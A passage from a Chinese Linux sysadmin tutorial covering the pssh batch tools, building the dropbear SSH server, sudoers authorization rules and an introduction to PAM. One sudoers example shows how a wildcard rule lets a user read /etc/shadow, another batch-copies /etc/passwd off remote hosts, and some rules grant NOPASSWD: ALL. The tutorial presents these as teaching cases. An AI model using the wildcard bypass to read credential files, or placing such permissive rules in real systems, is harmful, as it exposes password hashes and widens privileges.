[1] 16:48:29 [FAILURE] 10.0.0.6 Exited with error code 2
Stderr: ls: cannot access /data/10.0.0.6: No such file or directory
ls: cannot access /data/10.0.0.8: No such file or directory
[2] 16:48:29 [FAILURE] 10.0.0.8 Exited with error code 2
Stderr: ls: cannot access <span style="color: #8b2252;">'/data/10.0.0.6'</span>: No such file or directory
ls: cannot access <span style="color: #8b2252;">'/data/10.0.0.8'</span>: No such file or directory

[root@centos7 ~]#pssh -h hosts.txt -i <span style="color: #8b2252;">'ls /data/*'</span>
[1] 16:48:47 [SUCCESS] 10.0.0.6
[2] 16:48:47 [SUCCESS] 10.0.0.8
/data/centos7.log
/data/f1.txt
/data/f2.txt
/data/host_pass.txt
</pre>
</div>

<p>
<b>b）批量上传文件或目录（pscp.pssh命令）</b>
</p>

<p>
pscp.pssh功能是将本地文件批量复制到远程主机
</p>

<div class="org-src-container">
<pre class="src src-sh">pscp [-vAr] [-h hosts_file] [-H [user@]host[:port]] [-l user] [-p par] [-o outdir] [-e errdir] [-t timeout] [-O options] [-x args] [-X arg] local remote
</pre>
</div>

<p>
pscp-pssh选项
</p>

<div class="org-src-container">
<pre class="src src-sh">-v &#26174;&#31034;&#22797;&#21046;&#36807;&#31243;
-r &#36882;&#24402;&#22797;&#21046;&#30446;&#24405;
-h file&#65306;&#20027;&#26426;&#21015;&#34920;&#25991;&#20214;&#65292;&#20869;&#23481;&#26684;&#24335;&#8221;[user@]host[:port]&#8221;
-l&#65306;&#30331;&#24405;&#20351;&#29992;&#30340;&#29992;&#25143;&#21517;
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#26412;&#22320;curl.sh &#22797;&#21046;&#21040;/app/&#30446;&#24405;</span>
pscp.pssh -H 192.168.1.10 /root/test/curl.sh /app/
pscp.pssh -h host.txt /root/test/curl.sh /app/

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#26412;&#22320;&#22810;&#20010;&#25991;&#20214;&#25209;&#37327;&#22797;&#21046;&#21040;/app/&#30446;&#24405;</span>
pscp.pssh -H 192.168.1.10 /root/f1.sh /root/f2.sh /app/

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#26412;&#22320;&#30446;&#24405;&#25209;&#37327;&#22797;&#21046;&#21040;/app/&#30446;&#24405;</span>
pscp.pssh -H 192.168.1.10 -r /root/test/ /app/
</pre>
</div>

<p>
<b>c）批量下载文件或目录（pslurp命令）</b>
</p>

<p>
pslurp功能是将远程主机的文件批量复制到本地
</p>

<div class="org-src-container">
<pre class="src src-sh">pslurp [-vAr] [-h hosts_file] [-H [user@]host[:port]] [-l user] [-p par][-o outdir] [-e errdir] [-t timeout] [-O options] [-x args] [-X arg] [-L localdir] remote local&#65288;&#26412;&#22320;&#21517;&#65289;
</pre>
</div>

<p>
pslurp选项
</p>

<div class="org-src-container">
<pre class="src src-sh">-L &#25351;&#23450;&#20174;&#36828;&#31243;&#20027;&#26426;&#19979;&#36733;&#21040;&#26412;&#26426;&#30340;&#23384;&#20648;&#30340;&#30446;&#24405;&#65292;local&#26159;&#19979;&#36733;&#21040;&#26412;&#22320;&#21518;&#30340;&#21517;&#31216;
-r &#36882;&#24402;&#22797;&#21046;&#30446;&#24405;
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#25209;&#37327;&#19979;&#36733;&#30446;&#26631;&#26381;&#21153;&#22120;&#30340;passwd&#25991;&#20214;&#33267;/app&#19979;&#65292;&#24182;&#26356;&#21517;&#20026;user</span>
pslurp -H 192.168.1.10 -L /app /etc/passwd user

[root@centos7 ~]#pslurp -h hosts.txt -L /data/ /etc/redhat-release version
[1] 17:50:57 [SUCCESS] 10.0.0.6
[2] 17:50:57 [SUCCESS] 10.0.0.8
[root@centos7 ~]#tree /data
/data
&#9500;&#9472;&#9472; 10.0.0.6
&#9474; &#9492;&#9472;&#9472; version
&#9492;&#9472;&#9472; 10.0.0.8
&#9492;&#9472;&#9472; version
</pre>
</div>

<p>
<b>d）批量同步（prsync命令）</b>
同步本机/mnt/test目录下的文件或目录到远程机器的/mnt/test路径下
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@bastion-IDC ~]# prsync -l root -h hosts.txt -r /mnt/test/ /mnt/test/
</pre>
</div>

<p>
同步本机/mnt/test目录下的文件或目录到远程机器的/mnt路径下
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@bastion-IDC ~]# prsync -l root -h hosts.txt -r /mnt/test/ /mnt/
</pre>
</div>

<p>
注意：上面批量同步目录操作是将本机对应目录数据同步到远程机器上，远程机
器上对于目录下多余的文件也会保留（不会删除多余文件）
</p>

<p>
同理，批量同步文件操作，去掉-r参数
</p>

<p>
注意：同步文件的时候，其实就是完全覆盖，远程机器对应文件内的文件会被全部替换！
</p>

<p>
如下： 同步本机的/mnt/test/file文件内容到远程服务器/mnt/test/file文件内
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@bastion-IDC ~]# prsync -l root -h hosts.txt /mnt/test/file /mnt/test/file
[root@bastion-IDC ~]# prsync -l root -h hosts.txt /mnt/test/file /mnt/aaa
</pre>
</div>

<p>
<b>e）批量kill远程机器上的进程（pnuke命令）</b>
</p>

<p>
比如批量kill掉远程机器上的nginx进程
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@bastion-IDC ~]# pnuke -h hosts.txt -l root nginx
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:786a44d7-2098-46cd-9d77-d27aada7a4bd" class="outline-3">
<h3 id="h:786a44d7-2098-46cd-9d77-d27aada7a4bd">dropbear</h3>
<div class="outline-text-3" id="text-h:786a44d7-2098-46cd-9d77-d27aada7a4bd">
<p>
由Matt Johnston所开发的Secure Shell软件。Dropbear是一个相对较小的SSH服
务器和客户端。它运行在一个基于POSIX的各种平台。Dropbear是开源软件，在
麻省理工学院式的许可证。Dropbear是特别有用的“嵌入”式的Linux（或其他
Unix）系统，如无线路由器，期望在存储器与运算能力有限的情况下取代
OpenSSH，尤其是嵌入式系统
</p>

<p>
官网：<a href="http://matt.ucc.asn.au/dropbear/dropbear.html">http://matt.ucc.asn.au/dropbear/dropbear.html</a>
</p>

<p>
格式：
</p>

<pre class="example" id="org637ff3b">
dbclient [options] [user@]host[/port][,[user@]host/port],...] [command]

dropbearkey：主机密钥生成工具
dropbearkey  -t &lt;type&gt;  -f &lt;filename&gt;  [-s bits]
/etc/dropbear/

服务端程序：
dropbear
-p  [IP:]PORT
-F: 前台
-E：将日志发往错误输出
</pre>

<p>
范例：centos8编译安装dropbear
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;&#30456;&#20851;&#21253;:</span>
yum install gcc zlib-devel
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#19979;&#36733;</span>
wget http://matt.ucc.asn.au/dropbear/releases/dropbear-2019.78.tar.bz2
tar xf dropbear-2019.78.tar.bz2
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#32534;&#35793;&#23433;&#35013;</span>
<span style="color: #483d8b;">cd</span> dropbear-2019.78/
less INSTALL README
./configure --prefix=/apps/dropbear --sysconfdir=/etc/dropbear
make <span style="color: #a0522d;">PROGRAMS</span>=<span style="color: #8b2252;">"dropbear dbclient dropbearkey dropbearconvert scp"</span>
make <span style="color: #a0522d;">PROGRAMS</span>=<span style="color: #8b2252;">"dropbear dbclient dropbearkey dropbearconvert scp"</span> install

[root@centos8 dropbear-2019.78]#tree /apps/
/apps/
&#9492;&#9472;&#9472; dropbear
    &#9500;&#9472;&#9472; bin
    &#9474;   &#9500;&#9472;&#9472; dbclient
    &#9474;   &#9500;&#9472;&#9472; dropbearconvert
    &#9474;   &#9500;&#9472;&#9472; dropbearkey
    &#9474;   &#9492;&#9472;&#9472; scp
    &#9500;&#9472;&#9472; sbin
    &#9474;   &#9492;&#9472;&#9472; dropbear
    &#9492;&#9472;&#9472; share
        &#9492;&#9472;&#9472; man
            &#9500;&#9472;&#9472; man1
            &#9474;   &#9500;&#9472;&#9472; dbclient.1
            &#9474;   &#9500;&#9472;&#9472; dropbearconvert.1
            &#9474;   &#9492;&#9472;&#9472; dropbearkey.1
            &#9492;&#9472;&#9472; man8
                &#9492;&#9472;&#9472; dropbear.8


<span style="color: #b22222;">#</span><span style="color: #b22222;">&#37197;&#32622;PATH&#21464;&#37327;</span>
<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'PATH=/apps/dropbear/sbin:/apps/dropbear/bin:$PATH'</span> &gt; /etc/profile.d/dropbear.sh
<span style="color: #483d8b;">.</span> /etc/profile.d/dropbear.sh

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#25104;&#31169;&#38053;</span>
/apps/dropbear/sbin/dropbear -h
mkdir /etc/dropbear <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29983;&#25104;&#37197;&#32622;&#30446;&#24405;</span>
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key -s 2048
dropbearkey -t dss -f /etc/dropbear/dropbear_dsa_host_key

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21551;&#21160;ssh&#26381;&#21153;&#65306;</span>
dropbear -p :2222 -FE  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21069;&#21488;&#36816;&#34892;,&#30456;&#24403;&#20110;sshd</span>
dropbear -p :2222      <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21518;&#21488;&#36816;&#34892;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23458;&#25143;&#31471;&#35775;&#38382;&#65306;</span>
ssh -p 2222 root@127.0.0.1
dbclient -p 2222 root@127.0.0.1 <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30456;&#24403;&#20110;ssh</span>
</pre>
</div>

<p>
参考：
</p>

<p>
阮一峰 SSH 中文教程 <a href="https://wangdoc.com/ssh/index.html">https://wangdoc.com/ssh/index.html</a>
</p>
</div>
</div>
</section>
<section id="outline-container-h:e2208d28-365d-49ba-9280-9379f7a6d6e5" class="outline-2">
<h2 id="h:e2208d28-365d-49ba-9280-9379f7a6d6e5">利用sudo实现授权</h2>
<div class="outline-text-2" id="text-h:e2208d28-365d-49ba-9280-9379f7a6d6e5">
</div>
<div id="outline-container-h:8e1185a9-bb2a-4c10-ab17-9b5ace31feaa" class="outline-3">
<h3 id="h:8e1185a9-bb2a-4c10-ab17-9b5ace31feaa">sudo 介绍</h3>
<div class="outline-text-3" id="text-h:8e1185a9-bb2a-4c10-ab17-9b5ace31feaa">
<p>
sudo 即superuser do，允许系统管理员让普通用户执行一些或者全部的root命
令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录和管
理时间，同样也提高了安全性
</p>

<p>
在最早之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的
缺点之一在于必须要先告知超级用户的密码。sudo于1980年前后推出，sudo使一
般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名
字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特
殊的文件中（通常是/etc/sudoers），即完成对该用户的授权（此时该用户称为
“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，
此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答
后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为
5分钟，可在/etc/sudoers自定义），使用sudo不需要再次输入密码。
</p>

<p>
由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用
户作为管理帐号，例如Ubuntu、Mac OS X等。
</p>

<p>
<b>sudo特性</b> ：
</p>

<ul class="org-ul">
<li>sudo能够授权指定用户在指定主机上运行某些命令。如果未授权用户尝试使用
sudo，会提示联系管理员</li>
<li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到
中心主机或者日志服务器</li>
<li>sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它
的密码时，用户获得了一张存活期为5分钟的票</li>
<li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权
限和使用的主机。它所存放的位置默认是在/etc/sudoers，属性必须为0440</li>
</ul>
</div>
</div>
<div id="outline-container-h:cf355ec2-7eef-40f4-9a00-4f813ed3ed34" class="outline-3">
<h3 id="h:cf355ec2-7eef-40f4-9a00-4f813ed3ed34">sudo 组成</h3>
<div class="outline-text-3" id="text-h:cf355ec2-7eef-40f4-9a00-4f813ed3ed34">
<p>
包：sudo
</p>

<p>
配置文件： <code>/etc/sudo.conf</code>
</p>

<p>
授权规则配置文件： /etc/sudoers, /etc/sudoers.d
</p>

<p>
安全编辑授权规则文件和语法检查工具
</p>

<div class="org-src-container">
<pre class="src src-sh">/usr/sbin/visudo
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#26816;&#26597;&#35821;&#27861;</span>
visudo -c

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26816;&#26597;&#25351;&#23450;&#37197;&#32622;&#25991;&#20214;&#35821;&#27861;</span>
visudo -f /etc/sudoers.d/test
</pre>
</div>

<p>
授权编辑规则文件的工具： <code>/usr/bin/sudoedit</code>
</p>

<p>
执行授权命令： <code>/usr/bin/sudo</code>
</p>

<p>
时间戳文件： <code>/var/db/sudo</code>
</p>

<p>
日志文件： <code>/var/log/secure</code>
</p>
</div>
</div>
<div id="outline-container-h:87da6daf-cca5-47c9-b4e4-761b26cd02c3" class="outline-3">
<h3 id="h:87da6daf-cca5-47c9-b4e4-761b26cd02c3">sudo 命令</h3>
<div class="outline-text-3" id="text-h:87da6daf-cca5-47c9-b4e4-761b26cd02c3">
<pre class="example" id="org9a15e32">
sudo命令
ls -l /usr/bin/sudo
sudo –i –u wang 切换身份

sudo [-u user] COMMAND
-V             ： 显示版本信息等配置信息
-U user        ：(other user)配合-l选项来指定要列出哪个用户的权限信息
-u user        ：user 默认为root
                    若使用uid的方式指定用户，则需要使用"#uid"，但很多时候可能需要对"#"使用"\"转义，即使用"\#uid"
-l [command]   ：ll 列出用户在主机上可用的和被禁止的命令。
                    当配合command时，且该command是被允许执行的命令，将列出命令的全路径及该命令参数。
                    如果command是不被允许执行的，则sudo直接以状态码-1退出。
                    可以指定多个字母"l"来显示更详细的格式。
-n             ：使得sudo变成非交互模式，但如果安全策略是要求输入密码的，则sudo将报错
-S             ：(stdin)该选项使得sudo从标准输入而非终端设备上读取密码，给定的密码必须在尾部加上换行符
-s [command]   ：(shell)指定要切换到的shell，如果给定command，则在此shell上执行该命令
-v             ：再延长密码有效期限5分钟,更新时间戳
-k             ：清除时间戳（1970-01-01），下次需要重新输密码
-K             ：与-k类似，还要删除时间戳文件
-E             ：(environment)该选项告诉sudo在执行命令时保留自己的环境变量，保留环境变量的方式是执行环境配置文件。
                    但因为跨了用户，所以很可能某些家目录下的环境配置文件会因为无权限而执行失败，此时sudo将报错   
-b             ：在后台执行指令。 注意，如果使用该选项，将无法使用任务计划(job)来控制维护这些后台进程，需要交互的命令应该考虑是否真的要后台，因为可能会失败
-p             ：改变询问密码的提示符号
                    示例：-p "password on %h for user %p: "
--             ：暗示sudo命令行参数到此结束
</pre>
</div>
</div>
<div id="outline-container-h:778f69a5-53c2-422c-955b-7c785d22bbf7" class="outline-3">
<h3 id="h:778f69a5-53c2-422c-955b-7c785d22bbf7">sudo 授权规则配置</h3>
<div class="outline-text-3" id="text-h:778f69a5-53c2-422c-955b-7c785d22bbf7">
<p>
配置文件格式说明： <code>/etc/sudoer</code> , <code>/etc/sudoers.d/</code>
</p>

<p>
配置文件中支持使用通配符 glob
</p>

<pre class="example" id="org77c0623">
? 任意单一字符
* 匹配任意长度字符
[wxc] 匹配其中一个字符
[!wxc] 除了这三个字符的其它字符
\x 转义
[[alpha]] 字母
</pre>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">/bin/ls [[alpha]]*
</pre>
</div>

<p>
配置文件规则有两类
</p>

<ol class="org-ol">
<li>别名定义：不是必须的</li>
<li>授权规则：必须的</li>
</ol>

<p>
sudoers 授权规则格式：
</p>

<div class="org-src-container">
<pre class="src src-sh">&#29992;&#25143; <span style="color: #a0522d;">&#30331;&#20837;&#20027;&#26426;</span>=(&#20195;&#34920;&#29992;&#25143;) &#21629;&#20196;
user <span style="color: #a0522d;">host</span>=(runas) <span style="color: #483d8b;">command</span>
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">root <span style="color: #a0522d;">ALL</span>=(ALL) ALL
</pre>
</div>

<p>
格式说明：
</p>

<div class="org-src-container">
<pre class="src src-sh">user: &#36816;&#34892;&#21629;&#20196;&#32773;&#30340;&#36523;&#20221;
host: &#36890;&#36807;&#21738;&#20123;&#20027;&#26426;
(runas)&#65306;&#20197;&#21738;&#20010;&#29992;&#25143;&#30340;&#36523;&#20221;&#65292;&#40664;&#35748;&#20026;root&#29992;&#25143;
<span style="color: #483d8b;">command</span>: &#36816;&#34892;&#21738;&#20123;&#21629;&#20196;
</pre>
</div>

<p>
sudoers的别名
</p>

<div class="org-src-container">
<pre class="src src-sh">User&#21644;runas:&#36816;&#34892;&#21629;&#20196;&#32773;&#30340;&#36523;&#20221;
    username                &#29992;&#25143;
    <span style="color: #b22222;">#</span><span style="color: #b22222;">uid                    &#29992;&#25143;uid</span>
    %group_name             &#29992;&#25143;&#32452;
    %#gid                   &#29992;&#25143;&#32452;id
    user_alias|runas_alias  &#29992;&#25143;&#21035;&#21517;
    <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25903;&#25345;&#23558;&#22810;&#20010;&#29992;&#25143;&#23450;&#20041;&#20026;&#19968;&#32452;&#29992;&#25143;&#65292;&#31216;&#20043;&#20026;&#29992;&#25143;&#21035;&#21517;&#65292;&#21363;user_alias&#65307;</span>
host:&#36890;&#36807;&#21738;&#20123;&#20027;&#26426;
    ip&#25110;hostname
    network(/netmask)
    host_alias
<span style="color: #483d8b;">command</span>:&#36816;&#34892;&#21738;&#20123;&#21629;&#20196;
    <span style="color: #483d8b;">command</span> name
    directory
    sudoedit &#29305;&#27530;&#26435;&#38480;&#65292;&#21487;&#29992;&#20110;&#21521;&#20854;&#23427;&#29992;&#25143;&#25480;&#20104;sudo&#26435;&#38480;&#65307;
    Cmnd_Alias
</pre>
</div>

<p>
sudo别名有四种类型：
</p>

<ul class="org-ul">
<li>User_Alias</li>
<li>Runas_Alias</li>
<li>Host_Alias</li>
<li>Cmnd_Alias</li>
</ul>

<p>
别名格式：
</p>

<div class="org-src-container">
<pre class="src src-sh">[A-Z]([A-Z][0-9]_)*  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21035;&#21517;&#24517;&#39035;&#26159;&#22823;&#20889;&#23383;&#27597;&#32452;&#25104;&#65292;&#21487;&#20197;&#21253;&#21547;&#25968;&#23383;&#21450;_&#19979;&#21010;&#32447;&#32452;&#25104;</span>
</pre>
</div>

<p>
别名定义：
</p>

<div class="org-src-container">
<pre class="src src-sh">Alias_Type NAME1 = item1,item2,item3 : NAME2 = item4, item5
</pre>
</div>
</div>
</div>
<div id="outline-container-h:8537b992-fe9a-418d-8c99-16873122a00a" class="outline-3">
<h3 id="h:8537b992-fe9a-418d-8c99-16873122a00a">实战案例</h3>
<div class="outline-text-3" id="text-h:8537b992-fe9a-418d-8c99-16873122a00a">
<p>
范例1：
</p>

<div class="org-src-container">
<pre class="src src-sh">Student <span style="color: #a0522d;">ALL</span>=(ALL) ALL
%wheel <span style="color: #a0522d;">ALL</span>=(ALL) ALL
</pre>
</div>

<p>
范例2：
</p>

<div class="org-src-container">
<pre class="src src-sh">student <span style="color: #a0522d;">ALL</span>=(root) /sbin/pidof,/sbin/ifconfig  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22810;&#20010;&#21629;&#20196;&#20043;&#38388;&#29992;,&#36887;&#21495;&#20998;&#38548;</span>
%wheel <span style="color: #a0522d;">ALL</span>=(ALL) NOPASSWD: ALL
</pre>
</div>

<p>
范例3：用户别名和命令别名
</p>

<div class="org-src-container">
<pre class="src src-sh">User_Alias <span style="color: #a0522d;">NETADMIN</span>= netuser1,netuser2
Cmnd_Alias NETCMD = /usr/sbin/ip
NETADMIN <span style="color: #a0522d;">ALL</span>=&#65288;root&#65289; NETCMD
</pre>
</div>

<p>
范例4：
</p>

<div class="org-src-container">
<pre class="src src-sh">User_Alias <span style="color: #a0522d;">SYSADER</span>=wang,cici,%admins
User_Alias <span style="color: #a0522d;">DISKADER</span>=tom
Host_Alias <span style="color: #a0522d;">SERS</span>=www.meu.com,172.16.0.0/24
Runas_Alias <span style="color: #a0522d;">OP</span>=root
Cmnd_Alias <span style="color: #a0522d;">SYDCMD</span>=/bin/chown,/bin/chmod
Cmnd_Alias <span style="color: #a0522d;">DSKCMD</span>=/sbin/parted,/sbin/fdisk
SYSADER <span style="color: #a0522d;">SERS</span>= SYDCMD,DSKCMD
DISKADER <span style="color: #a0522d;">ALL</span>=(OP) DSKCMD
</pre>
</div>

<p>
范例5：
</p>

<div class="org-src-container">
<pre class="src src-sh">User_Alias ADMINUSER = adminuser1,adminuser2
Cmnd_Alias ADMINCMD = /usr/sbin/useradd&#65292;/usr/sbin/usermod, /usr/bin/passwd [azA-Z]*, !/usr/bin/passwd root
ADMINUSER <span style="color: #a0522d;">ALL</span>=(root) NOPASSWD:ADMINCMD&#65292;PASSWD:/usr/sbin/userdel
<span style="color: #b22222;">#</span><span style="color: #b22222;">NOPASSWD&#19981;&#29992;&#36755;&#20837;&#23494;&#30721;</span>
</pre>
</div>

<p>
范例6：指定用户执行命令所代表的用户，可以设定默认代表哪个用户
</p>

<div class="org-src-container">
<pre class="src src-sh">Defaults:wang <span style="color: #a0522d;">runas_default</span>=tom
wang <span style="color: #a0522d;">ALL</span>=(tom,jerry) ALL
</pre>
</div>

<p>
范例7：
</p>

<div class="org-src-container">
<pre class="src src-sh">wang 192.168.1.6,192.168.1.8=(root) /usr/sbin/,!/usr/sbin/useradd
</pre>
</div>

<p>
范例8：如何解决?
</p>

<div class="org-src-container">
<pre class="src src-sh">wang <span style="color: #a0522d;">ALL</span>=(ALL) /bin/cat /var/log/messages*

sudo cat /var/log/messages /etc/shadow <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21487;&#20197;&#30475;&#22810;&#20010;&#25991;&#20214;</span>
</pre>
</div>

<p>
范例9：授权用户修改配置文件，慎重
</p>

<div class="org-src-container">
<pre class="src src-sh">vim /etc/sudoers/test
Wang <span style="color: #a0522d;">ALL</span>=(ALL) sudoedit  

wang &#21487;&#20197;&#25191;&#34892;&#19979;&#38754;&#21629;&#20196;
sudoedit /etc/sudoers
sudoedit /etc/sudoers.d/test
</pre>
</div>

<p>
范例10：修改验证密码间隔为2分钟
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#vim /etc/sudoers
Defaults env_reset , <span style="color: #a0522d;">timestamp_timeout</span>=2
[root@centos8 ~]#sudo -V
......
Authentication timestamp timeout: 2.0 minutes......
</pre>
</div>

<p>
范例11：ubuntu 默认用户具有sudo权限
</p>

<div class="org-src-container">
<pre class="src src-sh">root@ubuntu1804:~# grep %sudo /etc/sudoers
%sudo <span style="color: #a0522d;">ALL</span>=(ALL:ALL) ALL
root@ubuntu1804:~# id wang
<span style="color: #a0522d;">uid</span>=1000(wang) <span style="color: #a0522d;">gid</span>=1000(wang)
<span style="color: #a0522d;">groups</span>=1000(wang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#40664;&#35748;&#30340;&#29992;&#25143;wang &#23646;&#20110;&#27492;sudo&#32452;&#65292;&#25152;&#20197;wang&#26377;&#25152;&#26377;&#26435;&#38480;</span>
</pre>
</div>

<p>
范例12: 修改ubuntu的visudo的默认编辑器
</p>

<div class="org-src-container">
<pre class="src src-sh">root@ubuntu1804:~# export <span style="color: #a0522d;">EDITOR</span>=vim
root@ubuntu1804:~# visudo
</pre>
</div>

<p>
范例：删除时间戳文件
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#su - wang
Last login: Mon May 25 10:28:14 CST 2020 on pts/1
[wang@centos8 ~]$<span style="color: #a0522d;">sudo</span> -K <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21024;&#38500;&#29992;&#25143;&#30340;&#26102;&#38388;&#25139;&#25991;&#20214;/run/sudo/ts/wang</span>
[wang@centos8 ~]$<span style="color: #a0522d;">exit</span>
<span style="color: #a020f0;">logout</span>
[root@centos8 ~]#ll /run/sudo/ts
</pre>
</div>

<p>
范例：修改sudo 提示符格式
</p>

<div class="org-src-container">
<pre class="src src-sh">[wang@centos8 ~]$<span style="color: #a0522d;">sudo</span> cat /var/log/messages
[sudo] password for wang:
[wang@centos8 ~]$<span style="color: #a0522d;">sudo</span> -p <span style="color: #8b2252;">"password on %h for user %p: "</span> cat /var/log/messages
password on centos8 for user wang:
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:ec458b62-5791-4220-abf6-e61f915ce171" class="outline-2">
<h2 id="h:ec458b62-5791-4220-abf6-e61f915ce171">PAM认证机制</h2>
<div class="outline-text-2" id="text-h:ec458b62-5791-4220-abf6-e61f915ce171">
</div>
<div id="outline-container-h:8e43a5df-c95b-48af-a985-e69be9aafe41" class="outline-3">
<h3 id="h:8e43a5df-c95b-48af-a985-e69be9aafe41">PAM 介绍</h3>
<div class="outline-text-3" id="text-h:8e43a5df-c95b-48af-a985-e69be9aafe41">
<p>
认证库：文本文件，MySQL，NIS，LDAP等
</p>

<p>
PAM:Pluggable Authentication Modules，插件式的验证模块，Sun公司于1995
年开发的一种与认证相关的通用框架机制。PAM 只关注如何为服务验证用户的
API，通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的
认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认
证方式而无需更改服务程序一种认证框架，自身不做认证
</p>
</div>
</div>
<div id="outline-container-h:93f38dac-54bc-45da-a170-57c83886be27" class="outline-3">
<h3 id="h:93f38dac-54bc-45da-a170-57c83886be27">PAM架构</h3>
<div class="outline-text-3" id="text-h:93f38dac-54bc-45da-a170-57c83886be27">

<figure id="orgee59422">
<img src="images/image-20210120200416213.png" alt="image-20210120200416213.png" width="50%">

</figure>

<p>
PAM提供了对所有服务进行认证的中央机制，适用于本地登录，远程登录，如：
telnet,rlogin,fsh,ftp,点对点协议PPP，su等应用程序中，系统管理员通过PAM
配置文件来制定不同应用程序的不同认证策略；应用程序开发者通过在服务程序
中使用PAM API(pam_xxxx( ))来实现对认证方法的调用；而PAM服务模块的开发
者则利用PAM SPI来编写模块（主要调用函数pam_sm_xxxx( )供PAM接口库调用，
将不同的认证机制加入到系统中；PAM接口库（libpam）则读取配置文件，将应
用程序和相应的PAM服务模块联系起来
</p>

<p>
PAM API：面向应用程序认证的接口 （应用程序开发）
</p>

<p>
PAM SPI：面向认证模块的接口 （模块开发）
</p>

<p>
PAM配置：面向配置的配置接口 （配置开发）
</p>
</div>
</div>
<div id="outline-container-h:a43e0457-b20b-47be-a40b-71ec8e8a9684" class="outline-3">
<h3 id="h:a43e0457-b20b-47be-a40b-71ec8e8a9684">PAM相关文件</h3>
<div class="outline-text-3" id="text-h:a43e0457-b20b-47be-a40b-71ec8e8a9684">
<ul class="org-ul">
<li>模块文件目录：/lib64/security/*.so （模块开发人员关注）</li>
<li>特定模块相关的设置文件：/etc/security/</li>
<li>应用程序调用PAM模块的配置文件
<ul class="org-ul">
<li>主配置文件：/etc/pam.conf，默认不存在， <b>一般不使用主配置</b></li>
<li>为每种应用模块提供一个专用的配置文件：/etc/pam.d/APP_NAME （常用）</li>
<li>注意：如/etc/pam.d存在，/etc/pam.conf将失效</li>
</ul></li>
</ul>

<p>
范例：查看程序是否支持PAM
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#ldd <span style="color: #ff00ff;">`which sshd`</span> |grep libpam
    libpam.so.0 =&gt; /lib64/libpam.so.0 (0x00007fea8e70d000)

[root@centos8 ~]#ldd <span style="color: #ff00ff;">`which passwd`</span> |grep pam
    libpam.so.0 =&gt; /lib64/libpam.so.0 (0x00007f3cce2ce000)
    libpam_misc.so.0 =&gt; /lib64/libpam_misc.so.0 (0x00007f3cce0ca000)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:82b1ea8a-b3dd-4440-942f-73259817e45c" class="outline-3">
<h3 id="h:82b1ea8a-b3dd-4440-942f-73259817e45c">PAM工作原理</h3>
<div class="outline-text-3" id="text-h:82b1ea8a-b3dd-4440-942f-73259817e45c">
<p>
PAM认证一般遵循这样的顺序：Service(服务) &#x2013;&gt; PAM(配置文件) &#x2013;&gt; pam_*.so
</p>

<p>
PAM认证首先要确定那一项服务，然后加载相应的PAM的配置文件(位于
/etc/pam.d下)，最后调用认证文件(位于/lib64/security下)进行安全认证
</p>


<figure id="org9788ac0">
<img src="images/image-20210120200457594.png" alt="image-20210120200457594.png" width="50%">

</figure>

<p>
PAM认证过程示例：
</p>

<blockquote>
<ol class="org-ol">
<li>使用者执行/usr/bin/passwd 程序，并输入密码</li>

<li>passwd开始调用PAM模块，PAM模块会搜寻passwd程序的PAM相关设置文件，这个设置文件一般是在/etc/pam.d/里边的与程序同名的文件，即PAM会搜寻/etc/pam.d/passwd此设置文件</li>

<li>经由/etc/pam.d/passwd设定文件的数据，取用PAM所提供的相关模块来进行验证</li>

<li>将验证结果回传给passwd这个程序，而passwd这个程序会根据PAM回传的结果决定下一个动作（重新输入密码或者通过验证）</li>
